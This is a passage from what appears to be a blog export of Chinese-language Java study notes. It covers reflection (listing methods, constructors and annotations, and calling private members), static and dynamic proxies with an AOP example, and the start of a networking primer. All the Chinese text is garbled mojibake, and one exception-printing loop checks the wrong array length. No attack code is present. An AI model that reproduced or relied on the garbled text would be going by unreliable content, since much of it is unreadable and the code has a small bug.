è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å‚æ•°ç±»å‹1 å½¢å‚å1, ...) throws XxxException{} */ @Test public void test1(){ Class clazz = Person.class; Method[] dmethods = clazz.getDeclaredMethods(); for(Method m: dmethods){ //1.è·å–æ–¹æ³•å£°æ˜çš„æ³¨è§£ Annotation[] annotations = m.getAnnotations(); for(Annotation a: annotations){ System.out.println(a); // @cn.xpshuai.java2.MyAnnotation(value=hello) } //2.æƒé™ä¿®é¥°ç¬¦ System.out.print(Modifier.toString(m.getModifiers()) + "\t"); //3.è¿”å›å€¼ç±»å‹ System.out.print(m.getReturnType().getName() + "\t"); //4.æ–¹æ³•å System.out.print(m.getName()); System.out.print("("); //5.å½¢å‚åˆ—è¡¨ Class[] parameterTypes = m.getParameterTypes(); if(!(parameterTypes == null || parameterTypes.length == 0)){ for(int i=0; i&lt; parameterTypes.length; i++){ if(i == parameterTypes.length-1){ System.out.print(parameterTypes[i].getName()); break; } System.out.print(parameterTypes[i].getName() + ", "); } } System.out.print(")"); //6.æŠ›å‡ºçš„å¼‚å¸¸ Class[] exceptionTypes = m.getExceptionTypes(); if(!(exceptionTypes == null || exceptionTypes.length == 0)){ System.out.println(" throws "); for (int i = 0; i &lt; exceptionTypes.length; i++) { if(i == parameterTypes.length-1){ System.out.println(exceptionTypes[i].getName()); } System.out.println(exceptionTypes[i].getName() + ", "); } } System.out.println(); } } @Test public void test2(){ } } package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.lang.reflect.ParameterizedType; import java.lang.reflect.Type; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-05 16:13 * @åŠŸèƒ½ï¼š */ public class OtherTest { /* è·å–æ„é€ å™¨ç»“æ„ */ @Test public void test(){ Class clazz = Person.class; // getConstructors(): å½“å‰è¿è¡Œæ—¶ç±»ä¸­å£°æ˜ä¸ºpublicçš„æ„é€ å™¨ Constructor[] constructors = clazz.getConstructors(); for(Constructor c: constructors){ System.out.println(c); } System.out.println("*************"); // getDeclaredConstructors(): å½“å‰è¿è¡Œæ—¶ç±»ä¸­çš„æ‰€æœ‰çš„æ„é€ å™¨ Constructor[] declaredConstructors = clazz.getDeclaredConstructors(); for(Constructor c: declaredConstructors){ System.out.println(c); } } /* æ¯”è¾ƒé‡è¦ è·å–è¿è¡Œæ—¶ç±»çš„çˆ¶ç±»åŠçˆ¶ç±»çš„æ³›å‹ ä»£ç ï¼šé€»è¾‘æ€§ä»£ç (å¯ä»¥å¹³æ—¶æœé›†ä¿ç•™,åˆ°æ—¶å€™å¤åˆ¶ç²˜è´´) vs åŠŸèƒ½æ€§ä»£ç  */ @Test public void test1(){ Class clazz = Person.class; // getSuperclass(): è·å–è¿è¡Œæ—¶ç±»çš„çˆ¶ç±» Class superclass = clazz.getSuperclass(); System.out.println(superclass); // class cn.xpshuai.java2.Creature // getGenericSuperclass(): è·å–è¿è¡Œæ—¶ç±»çš„å¸¦æ³›å‹çš„çˆ¶ç±» Type genericSuperclass = clazz.getGenericSuperclass(); System.out.println(genericSuperclass); // cn.xpshuai.java2.Creature&lt;java.lang.String> // åŸºäºgetGenericSuperclass(), å¼ºè½¬ç„¶å...: è·å–è¿è¡Œæ—¶ç±»çš„å¸¦æ³›å‹çš„çˆ¶ç±»çš„æ³›å‹ Type genericSuperclass2 = clazz.getGenericSuperclass(); //åšå¼ºè½¬ ParameterizedType paramType = (ParameterizedType)genericSuperclass2; //è·å–æ³›å‹ç±»å‹ Type[] actualTypeArguments = paramType.getActualTypeArguments(); System.out.println(actualTypeArguments[0]); // å½¢å¼æ˜¯è¿™æ ·çš„ cn.xpshuai.java2.Creature&lt;java.lang.String> System.out.println(actualTypeArguments[0].getTypeName()); //è¿™é‡Œå°±ä¸€ä¸ªï¼Œå°±æ²¡forå¾ªç¯. å¯ä»¥getTypeName()å¾—åˆ° java.lang.Stringå½¢å¼ System.out.println(((Class)actualTypeArguments[0]).getName()); // ä¹Ÿå¯ä»¥å¼ºè½¬ä¸ºClassç„¶ågetName(), java.lang.String } /* æ¯”è¾ƒé‡è¦ï¼ˆåŠ¨æ€ä»£ç†ä¸­ä¼šç”¨ï¼‰ è·å–è¿è¡Œæ—¶ç±»å®ç°çš„æ¥å£ */ @Test public void test2(){ Class clazz = Person.class; // è·å–è¿è¡Œæ—¶ç±»å®ç°çš„æ¥å£ Class[] interfaces = clazz.getInterfaces(); for(Class c: interfaces){ System.out.println(c); } System.out.println("********"); // è·å–è¿è¡Œæ—¶ç±»å®ç°çš„æ¥å£ Class[] interfaces1 = clazz.getSuperclass().getInterfaces(); for(Class c: interfaces1){ System.out.println(c); } } /* è·å–è¿è¡Œæ—¶ç±»æ‰€åœ¨çš„åŒ… */ @Test public void test3(){ Class clazz = Person.class; Package aPackage = clazz.getPackage(); System.out.println(aPackage); } /* æ¯”è¾ƒé‡è¦ è·å–è¿è¡Œæ—¶ç±»å£°æ˜çš„æ³¨è§£ åé¢ï¼Œä¸»è¦æ˜¯æ ¹æ®æ³¨è§£è·å–åˆ°æ³¨è§£çš„å†…å®¹ï¼Œåˆ¤æ–­ä½ è¦å¹²ä»€ä¹ˆ */ @Test public void test4(){ Class clazz = Person.class; // è·å–è¿è¡Œæ—¶ç±»å£°æ˜çš„æ³¨è§£ Annotation[] annotations = clazz.getAnnotations(); for(Annotation a: annotations){ System.out.println(a); // @cn.xpshuai.java2.MyAnnotation(value=Hi) } } @Test public void test5(){ } } è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„(é‡è¦ï¼ŒæŒæ¡) ä¸»è¦æ˜¯è°ƒ æ–¹æ³•ã€å…¶æ¬¡æ˜¯å±æ€§å’Œæ„é€ å™¨ package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-06 9:37 * @åŠŸèƒ½ï¼š è°ƒç”¨è¿è¡Œæ—¶ç±»çš„æŒ‡å®šç»“æ„(é‡è¦ï¼ŒæŒæ¡) > ä¸»è¦æ˜¯è°ƒæ–¹æ³•ã€å…¶æ¬¡æ˜¯å±æ€§å’Œæ„é€ å™¨ */ public class ReflectionTest { /* è¿™ä¸ªä¸éœ€è¦æŒæ¡ */ @Test public void test() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException { Class clazz = Person.class; System.out.println(clazz); //åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ Person p = (Person) clazz.newInstance(); System.out.println(p); //è·å–æŒ‡å®šçš„å±æ€§(é€šå¸¸ä¸é‡‡ç”¨æ­¤æ–¹æ³•ï¼Œå› ä¸ºépublicçš„æ— æ³•è·å–) Field id = clazz.getField("id"); //è®¾ç½®å½“å‰å±æ€§çš„å€¼ // set():å‚æ•°1->æŒ‡æ˜è®¾ç½®å“ªä¸ªå¯¹è±¡çš„å±æ€§ å‚æ•°2->å°†æ­¤å±æ€§å€¼è®¾ç½®ä¸ºå¤šå°‘ id.set(p, 1001); //è·å–å½“å‰å±æ€§çš„å€¼ // get(): å‚æ•°1-->è·å–å“ªä¸ªå¯¹è±¡çš„å½“å‰å±æ€§ int pid = (int)id.get(p); System.out.println(pid); } /* éœ€è¦æŒæ¡ æ ‡å‡†çš„ï¼Œæ“ä½œè¿è¡Œæ—¶ç±»ä¸­çš„æŒ‡å®šçš„å±æ€§ */ @Test public void test1() throws Exception{ Class clazz = Person.class; System.out.println(clazz); //åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ Person p = (Person) clazz.newInstance(); //è¿™ä¸ªå¸¸ç”¨ï¼ï¼ï¼ //1.getDeclaredField(String fieldName):è·å–æŒ‡å®šå˜é‡åçš„å±æ€§ Field name = clazz.getDeclaredField("name"); //2.ä¿è¯å½“å‰å±æ€§å¯è®¿é—® name.setAccessible(true); //æƒé™ä¸å¤Ÿçš„ï¼Œè®¾ç½®å…è®¸æ–¹æ³• //3.è·å–ã€è®¾ç½®æŒ‡å®šå¯¹è±¡çš„å±æ€§å€¼ name.set(p, "Jerry"); System.out.println(name.get(p)); System.out.println(p); } /* éœ€è¦æŒæ¡ æ ‡å‡†çš„ï¼Œæ“ä½œè¿è¡Œæ—¶ç±»ä¸­çš„æŒ‡å®šçš„æ–¹æ³• */ @Test public void test2() throws Exception{ Class clazz = Person.class; System.out.println(clazz); //åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ Person p = (Person) clazz.newInstance(); //è¿™ä¸ªå¸¸ç”¨ï¼ï¼ï¼ //1.getDeclaredMethod(String methodName):è·å–æŒ‡å®šå˜é‡åçš„å±æ€§ //å‚æ•°1ï¼šæŒ‡æ˜è·å–çš„æ–¹æ³•çš„åç§°ã€‚ å‚æ•°2ï¼šæŒ‡æ˜è·å–çš„æ–¹æ³•çš„å½¢å‚åˆ—è¡¨ Method show = clazz.getDeclaredMethod("show", String.class); //2.ä¿è¯å½“å‰æ–¹æ³•å¯è®¿é—® show.setAccessible(true); //æƒé™ä¸å¤Ÿçš„ï¼Œè®¾ç½®å…è®¸æ–¹æ³• //3.è°ƒç”¨invoke()æ‰§è¡Œ: å‚æ•°1ï¼šæ–¹æ³•çš„è°ƒç”¨è€…ï¼Œ å‚æ•°2ï¼šç»™æ–¹æ³•å½¢å‚èµ‹å€¼çš„å®å‚ //invoke()çš„è¿”å›å€¼å³ä¸ºå¯¹åº”ç±»ä¸­è°ƒç”¨çš„æ–¹æ³•çš„è¿”å›å€¼ // show.invoke(p, "CHN"); Object returnVal = show.invoke(p, "CHN"); System.out.println(returnVal); System.out.println("**************"); //è°ƒç”¨é™æ€æ–¹æ³• // private static void showDesc() Method sd = clazz.getDeclaredMethod("showDesc"); sd.setAccessible(true); //è°ƒç”¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å†™å½“å‰classæˆ–null sd.invoke(Person.class); //å¦‚æœè¯¥è¿è¡Œæ—¶ç±»çš„æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼Œåˆ™æ­¤invokeçš„è¿”å›å€¼ä¸ºnull // sd.invoke(null); //å†™nullä¹Ÿè¡Œï¼Œä¸æ¯«ä¸å½±å“ } /* æ“ä½œè¿è¡Œæ—¶ç±»ä¸­çš„æŒ‡å®šçš„æ„é€ å™¨ï¼ˆä¸å¤ªå¸¸ç”¨ï¼Œå› ä¸ºå¸¸ç”¨newInstance()æ¥å®ä¾‹åŒ–ï¼‰ */ @Test public void test3() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class clazz = Person.class; //1.è·å–æŒ‡å®šçš„æ„é€ å™¨ï¼ˆå‚æ•°ï¼šåªéœ€æŒ‡æ˜å‚æ•°åˆ—è¡¨ï¼‰ Constructor constructor = clazz.getDeclaredConstructor(String.class); //2.ä¿è¯æ­¤æ„é€ å™¨å¯è®¿é—® constructor.setAccessible(true); //3.åˆ›å»ºè¿è¡Œæ—¶ç±»çš„å¯¹è±¡ Person per = (Person)constructor.newInstance("Tom"); System.out.println(per); } } åå°„çš„åº”ç”¨: åŠ¨æ€ä»£ç†ä»£ç†è®¾è®¡æ¨¡å¼çš„åŸç†:ä½¿ç”¨ä¸€ä¸ªä»£ç†å°†å¯¹è±¡åŒ…è£…èµ·æ¥,ç„¶åç”¨è¯¥ä»£ç†å¯¹è±¡å–ä»£åº·å§‹å¯¹è±¡ã€‚ä»»ä½•å¯¹åŸå§‹å¯¹è±¡çš„è°ƒç”¨éƒ½è¦é€šè¿‡ä»£ç†ã€‚ä»£ç†å¯¹è±¡å†³å®šæ˜¯å¦ä»¥åŠä½•æ—¶å°†æ–¹æ³•è°ƒç”¨è½¬åˆ°åŸå§‹å¯¹è±¡ä¸Šã€‚ ä¹‹å‰ä¸ºå¤§å®¶è®²è§£è¿‡ä»£ç†æœºåˆ¶çš„æ“ä½œï¼Œå±äºé™æ€ä»£ç†ï¼Œç‰¹å¾æ˜¯ä»£ç†ç±»å’Œç›®æ ‡å¯¹è±¡çš„ç±»éƒ½æ˜¯åœ¨ç¼–è¯‘æœŸé—´ç¡®å®šä¸‹æ¥ï¼Œä¸åˆ©äºç¨‹åºçš„æ‰©å±•ã€‚åŒæ—¶ï¼Œæ¯ä¸€ä¸ªä»£ç†ç±»åªèƒ½ä¸ºä¸€ä¸ªæ¥å£æœåŠ¡ï¼Œè¿™æ ·ä¸€æ¥ç¨‹åºå¼€å‘ä¸­å¿…ç„¶äº§ç”Ÿè¿‡å¤šçš„ä»£ç†ã€‚æœ€å¥½å¯ä»¥é€šè¿‡ä¸€ä¸ªä»£ç†ç±»å®Œæˆå…¨éƒ¨çš„ä»£ç†åŠŸèƒ½ã€‚ åŠ¨æ€ä»£ç†æ˜¯æŒ‡å®¢æˆ·é€šè¿‡ä»£ç†ç±»æ¥è°ƒç”¨å…¶å®ƒå¯¹è±¡çš„æ–¹æ³•ï¼Œå¹¶ä¸”æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶æ ¹æ®éœ€è¦åŠ¨æ€åˆ›å»ºç›®æ ‡ç±»çš„ä»£ç†å¯¹è±¡ã€‚ åŠ¨æ€ä»£ç†ä½¿ç”¨åœºåˆ: è°ƒè¯• è¿œç¨‹æ–¹æ³•è°ƒç”¨ åŠ¨æ€ä»£ç†ç›¸æ¯”äºé™æ€ä»£ç†çš„ä¼˜ç‚¹:æŠ½è±¡è§’è‰²ä¸­ï¼ˆæ¥å£ï¼‰å£°æ˜çš„æ‰€æœ‰æ–¹æ³•éƒ½è¢«è½¬ç§»åˆ°è°ƒç”¨å¤„ç†å™¨ä¸€ä¸ªé›†ä¸­çš„æ–¹æ³•ä¸­å¤„ç†ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ›´åŠ çµæ´»å’Œç»Ÿä¸€çš„å¤„ç†ä¼—å¤šçš„æ–¹æ³•ã€‚ å…ˆçœ‹ä¸€ä¸‹ä¹‹å‰å­¦è¿‡çš„é™æ€ä»£ç†ï¼š package cn.xpshuai.java4; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-06 13:21 * @åŠŸèƒ½ï¼šé™æ€ä»£ç†çš„ä¾‹å­ * * ç‰¹ç‚¹ï¼šä»£ç†ç±»å’Œè¢«ä»£ç†ç±»åœ¨ç¼–è¯‘æœŸé—´ï¼Œå°±ç¡®å®šäº†ä¸‹æ¥ */ interface ClothFactory{ void produceCloth(); } //ä»£ç†ç±» class ProxyClothFactory implements ClothFactory{ private ClothFactory factory; // å°±ç”¨è¢«ä»£ç†ç±»å¯¹è±¡è¿›è¡Œå®ä¾‹åŒ– public ProxyClothFactory(ClothFactory factory){ this.factory = factory; } @Override public void produceCloth() { System.out.println("ä»£ç†å·¥å‚åšä¸€äº›å‡†å¤‡å·¥ä½œ..."); factory.produceCloth(); System.out.println("ä»£ç†å·¥å‚åšä¸€äº›åç»­çš„æ”¶å°¾å·¥ä½œ..."); } } //è¢«ä»£ç†ç±» class NikeClothFactory implements ClothFactory{ @Override public void produceCloth() { System.out.println("Nikeå·¥å‚ç”Ÿäº§è¿åŠ¨æœ"); } } //æµ‹è¯• public class StaticProxyTest { public static void main(String[] args) { //åˆ›å»ºè¢«ä»£ç†ç±»çš„å¯¹è±¡ ClothFactory nike = new NikeClothFactory(); //å¤šæ€çš„å½¢å¼ //åˆ›å»ºä»£ç†ç±»çš„å¯¹è±¡ ProxyClothFactory proxyClothFactory = new ProxyClothFactory(nike); //ä»£ç†ç±»çš„å¯¹è±¡è°ƒæ–¹æ³• proxyClothFactory.produceCloth(); } } åŠ¨æ€ä»£ç†çš„ä¸¾ä¾‹(è¦æ±‚ï¼Œæ˜ç™½è¿™ä¸ªé€»è¾‘å°±è¡Œï¼Œä¸éœ€è¦æ­»è®°ä»£ç )ï¼š package cn.xpshuai.java4; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-06 13:33 * @åŠŸèƒ½ï¼šåŠ¨æ€ä»£ç†çš„ä¸¾ä¾‹ */ interface Human{ String getBelief(); void eat(String food); } //è¢«ä»£ç†ç±» class SuperMan implements Human{ @Override public String getBelief() { return "I believe I can fly."; } @Override public void eat(String food) { System.out.println("æˆ‘å–œæ¬¢åƒï¼š" + food); } } /* è¦æƒ³å®ç°åŠ¨æ€ä»£ç†ï¼Œéœ€è¦è§£å†³çš„é—®é¢˜ï¼Ÿ 1.å¦‚ä½•æ ¹æ®åŠ è½½åˆ°å†…å­˜ä¸­çš„è¢«ä»£ç†ç±»ï¼ŒåŠ¨æ€çš„åˆ›å»ºä¸€ä¸ªä»£ç†ç±»åŠå…¶å¯¹è±¡ 2.å½“é€šè¿‡ä»£ç†ç±»çš„å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå¦‚ä½•åŠ¨æ€çš„å»è°ƒç”¨è¢«ä»£ç†ç±»ä¸­çš„åŒåæ–¹æ³• */ class ProxyFactory{ //è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ï¼Œè§£å†³é—®é¢˜1 public static Object getProxyInstance(Object obj){ //objï¼šè¢«ä»£ç†ç±»çš„å¯¹è±¡ MyInvocationHandler handler = new MyInvocationHandler(); handler.bind(obj); return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), handler); } } class MyInvocationHandler implements InvocationHandler{ private Object obj; //éœ€è¦ä½¿ç”¨è¢«ä»£ç†ç±»çš„å¯¹è±¡è¿›è¡Œèµ‹å€¼ public void bind(Object obj){ this.obj = obj; } //å½“æˆ‘ä»¬é€šè¿‡ä»£ç†ç±»çš„å¯¹è±¡ï¼Œè¯·ç”¨æ–¹æ³•aæ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å¦‚ä¸‹çš„çŠ¯æ³•:invoke() //å°†è¢«ä»£ç†ç±»è¦æŒ‡å®šçš„æ–¹æ³•açš„åŠŸèƒ½å°±å£°æ˜åœ¨invoke()ä¸­ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // method:å³ä¸ºä»£ç†ç±»å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¹Ÿå°±ä½œä¸ºäº†è¢«ä»£ç†ç±»å¯¹è±¡è¦è°ƒç”¨çš„æ–¹æ³• // obj: è¢«ä»£ç†ç±»çš„å¯¹è±¡ Object returnVal = method.invoke(obj, args); //ä¸Šè¿°æ–¹æ³•çš„è¿”å›å€¼å°±ä½œä¸ºå½“å‰ç±»ä¸­çš„invoke()çš„è¿”å›å€¼ return returnVal; } } //æµ‹è¯• public class ProxyTest { public static void main(String[] args) { SuperMan superMan = new SuperMan(); // proxyInstance: ä»£ç†ç±»çš„å¯¹è±¡ Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan); //å½“é€šè¿‡ä»£ç†ç±»å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨çš„è°ƒç”¨è¢«ä»£ç†ç±»ä¸­åŒåçš„æ–¹æ³• String belief = proxyInstance.getBelief(); System.out.println(belief); proxyInstance.eat("éº»è¾£çƒ«"); //åªéœ€è¦æä¾›è¢«ä»£ç†ç±»å’Œæ¥å£å°±è¡Œå•¦ System.out.println("*************"); NikeClothFactory nikeClothFactory = new NikeClothFactory(); ClothFactory proxyClothInstance1 = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory); proxyClothInstance1.produceCloth(); } } AOPä¸åŠ¨æ€ä»£ç†ä¸¾ä¾‹ï¼š é¢å‘åˆ‡é¢ç¼–ç¨‹ package cn.xpshuai.java4; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-02-06 13:33 * @åŠŸèƒ½ï¼šåŠ¨æ€ä»£ç†çš„ä¸¾ä¾‹ */ interface Human{ String getBelief(); void eat(String food); } //è¢«ä»£ç†ç±» class SuperMan implements Human{ @Override public String getBelief() { return "I believe I can fly."; } @Override public void eat(String food) { System.out.println("æˆ‘å–œæ¬¢åƒï¼š" + food); } } /* è¦æƒ³å®ç°åŠ¨æ€ä»£ç†ï¼Œéœ€è¦è§£å†³çš„é—®é¢˜ï¼Ÿ 1.å¦‚ä½•æ ¹æ®åŠ è½½åˆ°å†…å­˜ä¸­çš„è¢«ä»£ç†ç±»ï¼ŒåŠ¨æ€çš„åˆ›å»ºä¸€ä¸ªä»£ç†ç±»åŠå…¶å¯¹è±¡ 2.å½“é€šè¿‡ä»£ç†ç±»çš„å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå¦‚ä½•åŠ¨æ€çš„å»è°ƒç”¨è¢«ä»£ç†ç±»ä¸­çš„åŒåæ–¹æ³• */ class ProxyFactory{ //è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ï¼Œè§£å†³é—®é¢˜1 public static Object getProxyInstance(Object obj){ //objï¼šè¢«ä»£ç†ç±»çš„å¯¹è±¡ MyInvocationHandler handler = new MyInvocationHandler(); handler.bind(obj); return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), handler); } } class MyInvocationHandler implements InvocationHandler{ private Object obj; //éœ€è¦ä½¿ç”¨è¢«ä»£ç†ç±»çš„å¯¹è±¡è¿›è¡Œèµ‹å€¼ public void bind(Object obj){ this.obj = obj; } //å½“æˆ‘ä»¬é€šè¿‡ä»£ç†ç±»çš„å¯¹è±¡ï¼Œè¯·ç”¨æ–¹æ³•aæ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å¦‚ä¸‹çš„çŠ¯æ³•:invoke() //å°†è¢«ä»£ç†ç±»è¦æŒ‡å®šçš„æ–¹æ³•açš„åŠŸèƒ½å°±å£°æ˜åœ¨invoke()ä¸­ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { HumanUtil util = new HumanUtil(); util.method1(); // method:å³ä¸ºä»£ç†ç±»å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¹Ÿå°±ä½œä¸ºäº†è¢«ä»£ç†ç±»å¯¹è±¡è¦è°ƒç”¨çš„æ–¹æ³• // obj: è¢«ä»£ç†ç±»çš„å¯¹è±¡ Object returnVal = method.invoke(obj, args); util.method2(); //ä¸Šè¿°æ–¹æ³•çš„è¿”å›å€¼å°±ä½œä¸ºå½“å‰ç±»ä¸­çš„invoke()çš„è¿”å›å€¼ return returnVal; } } //æµ‹è¯• public class ProxyTest { public static void main(String[] args) { SuperMan superMan = new SuperMan(); // proxyInstance: ä»£ç†ç±»çš„å¯¹è±¡ Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan); //å½“é€šè¿‡ä»£ç†ç±»å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨çš„è°ƒç”¨è¢«ä»£ç†ç±»ä¸­åŒåçš„æ–¹æ³• String belief = proxyInstance.getBelief(); System.out.println(belief); proxyInstance.eat("éº»è¾£çƒ«"); //åªéœ€è¦æä¾›è¢«ä»£ç†ç±»å’Œæ¥å£å°±è¡Œå•¦ System.out.println("*************"); NikeClothFactory nikeClothFactory = new NikeClothFactory(); ClothFactory proxyClothInstance1 = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory); proxyClothInstance1.produceCloth(); } } //æµ‹è¯•AOPä»£ç†çš„é€šç”¨æ–¹æ³• class HumanUtil{ // é€šç”¨æ–¹æ³•1 public void method1(){ System.out.println("é€šç”¨æ–¹æ³•1"); } // é€šç”¨æ–¹æ³• public void method2(){ System.out.println("é€šç”¨æ–¹æ³•2"); } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Javaå­¦ä¹ ç¬”è®°</tag>
        <tag>Javaåå°„</tag>
        <tag>åŠ¨æ€ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹ç½‘ç»œç¼–ç¨‹åˆæ¶‰]]></title>
    <url>%2Fposts%2F46158%2F</url>
    <content type="text"><![CDATA[ç½‘ç»œç¼–ç¨‹æ¦‚è¿°Javaæä¾›çš„ç½‘ç»œç±»åº“ï¼Œå¯ä»¥å®ç°æ— ç—›çš„ç½‘ç»œè¿æ¥ï¼Œè”ç½‘çš„åº•å±‚ç»†èŠ‚è¢«léšè—åœ¨ Javaçš„æœ¬æœºå®‰è£…ç³»ç»Ÿé‡Œï¼Œç”±JVMè¿›è¡Œæ§åˆ¶ã€‚å¹¶ä¸”Javaå®ç°äº†ä¸€ä¸ªè·¨å¹³å°çš„ç½‘ç»œåº“ï¼Œç¨‹åºå‘˜é¢å¯¹çš„æ˜¯ä¸€ä¸ªç»Ÿä¸€çš„ç½‘ç»œç¼–ç¨‹ç¯å¢ƒã€‚ è®¡ç®—æœºç½‘ç»œ:æŠŠåˆ†å¸ƒåœ¨ä¸åŒåœ°ç†åŒºåŸŸçš„è®¡ç®—æœºä¸ä¸“é—¨çš„å¤–éƒ¨è®¾å¤‡ç”¨é€šä¿¡çº¿è·¯äº’è¿æˆä¸€ä¸ªè§„æ¨¡å¤§ã€åŠŸèƒ½å¼ºçš„ç½‘ç»œç³»ç»Ÿï¼Œä»è€Œä½¿ä¼—å¤šçš„è®¡ç®—æœºå¯ä»¥æ–¹ä¾¿åœ°äº’ç›¸ä¼ é€’ä¿¡æ¯ã€å…±äº«ç¡¬ä»¶ã€è½¯ä»¶ã€æ•°æ®ä¿¡æ¯ç­‰èµ„æºã€‚ ç½‘ç»œç¼–ç¨‹çš„ç›®çš„:ç›´æ¥æˆ–é—´æ¥åœ°é€šè¿‡ç½‘ç»œåè®®ä¸å…¶å®ƒè®¡ç®—æœºå®ç°æ•°æ®äº¤æ¢ï¼Œè¿›è¡Œé€šè®¯ã€‚ ç½‘ç»œç¼–ç¨‹ä¸­æœ‰ä¸¤ä¸ªä¸»è¦çš„é—®é¢˜: å¦‚ä½•å‡†ç¡®åœ°å®šä½ç½‘ç»œä¸Šä¸€å°æˆ–å¤šå°ä¸»æœº; å®šä½ä¸»æœºä¸Šçš„ç‰¹å®šçš„åº”ç”¨ æ‰¾åˆ°ä¸»æœºåå¦‚ä½•å¯é é«˜æ•ˆåœ°è¿›è¡Œæ•°æ®ä¼ è¾“ ç½‘ç»œæ¨¡å‹ï¼š OSIå‚è€ƒæ¨¡å‹ TCP/IPå‚è€ƒæ¨¡å‹ äº”å±‚æ¨¡å‹ ç½‘ç»œé€šä¿¡è¦ç´ æ¦‚è¿° IPå’Œç«¯å£å· ç½‘ç»œé€šä¿¡åè®® é€šä¿¡è¦ç´ 1ï¼šIPå’Œç«¯å£å·IP: Javaä½¿ç”¨InetAddressç±»ä»£æ›¿IP å”¯ä¸€çš„æ ‡è¯†Internetä¸Šçš„è®¡ç®—æœºï¼ˆé€šä¿¡å®ä½“)æœ¬åœ°å›ç¯åœ°å€(hostAddress):127.0.0.1 ä¸»æœºå(hostName): localhost IPåœ°å€åˆ†ç±»æ–¹å¼1:IPV4å’ŒIPV6IPV4:4ä¸ªå­—èŠ‚ç»„æˆï¼Œ4ä¸ª0-255ã€‚å¤§æ¦‚42äº¿ï¼Œ30äº¿éƒ½åœ¨åŒ—ç¾ï¼Œäºšæ´²4äº¿ã€‚2011å¹´åˆå·²ç»ç”¨å°½ã€‚ä»¥ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºï¼Œå¦‚192.168.0.1 IPV6:128ä½ï¼ˆ16ä¸ªå­—èŠ‚ï¼‰ï¼Œå†™æˆ8ä¸ªæ— ç¬¦å·æ•´æ•°ï¼Œæ¯ä¸ªæ•´æ•°ç”¨å››ä¸ªåå…­è¿›åˆ¶ä½è¡¨ç¤ºï¼Œæ•°ä¹‹é—´ç”¨å†’å·(:ï¼‰åˆ†å¼€ï¼Œå¦‚:3ffe:3201:1401:1280:c8ff:fe4d:db39:1984 IPåœ°å€åˆ†ç±»æ–¹å¼2: å…¬ç½‘åœ°å€(ä¸‡ç»´ç½‘ä½¿ç”¨)å’Œç§æœ‰åœ°å€(å±€åŸŸç½‘ä½¿ç”¨)ã€‚ å…¬ç½‘åœ°å€ ç§æœ‰åœ°å€ A 1.0.0.0 -127.0.0.0 10.0.0.0/8 â€”-&gt; 10.0.0.0~10.255.255.255ï¼ˆAç±»ï¼‰ B 128.0.0.0-191.255.255.255 172.16.0.0/12 â€”-&gt; 172.16.0.0~172.31.255.255ï¼ˆBç±»ï¼‰ C 192.0.0.0-223.255.255.255 192.168.0.0/16 â€”-&gt; 192.168.0.0~192.168.255.255ï¼ˆCç±»ï¼‰ D 240.0.0.0-255.255.255.254(å¤šæ’­) ç«¯å£å·ï¼š ç«¯å£å·æ 